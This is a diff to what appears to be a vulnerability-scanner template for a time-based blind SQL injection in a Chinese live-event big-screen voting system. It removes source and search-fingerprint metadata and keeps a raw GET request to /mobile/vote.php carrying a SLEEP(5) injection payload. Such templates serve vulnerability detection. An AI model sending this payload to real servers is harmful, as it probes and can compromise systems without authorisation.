@@ -3,14 +3,8 @@ info:
   name: 金华迪加现场大屏互动系统vote存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ti3igi23i0b7r2tx
-
-    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ti3igi23i0b7r2tx
-    fofa: body="/wall/themes/meepo/assets/images/defaultbg.jpg" || title="现场活动大屏幕系统" || body="/Modules/module.php?m=importlottery"||title="微信上墙首页"&&body="/wall/index.php"|| header="/frame.php"
 http:
 - raw:
   - GET /mobile/vote.php?rentopenid="XOR(SELECT(0)FROM(SELECT(SLEEP(5)))a)XOR"Z HTTP/1.1
